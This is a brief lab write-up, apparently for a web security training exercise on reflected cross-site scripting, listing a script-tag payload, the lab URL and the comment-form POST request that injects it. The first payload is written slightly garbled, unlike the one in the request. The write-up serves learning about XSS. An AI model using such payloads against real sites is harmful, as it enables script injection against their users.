# Case 0: Lab: Reflected XSS into HTML context with nothing encoded

**Payload:** 
```js
<script>alert('xss')script</script>
```
**Affected Locations:**
```
https://0d7.web-security-academy.net/post?postId=2
```
**Request:**
```http
POST /post/comment HTTP/2
Host: 0ad0008304c4af2b80516762005400d7.web-security-academy.net

...Omitted for Brevity...

csrf=Tox0asbtJx9ysgwuCQuXz5ItWKaMNAQz&postId=2&comment=<script>alert('xss')</script>&name=test&email=test@test.com&website=http://test.com
```
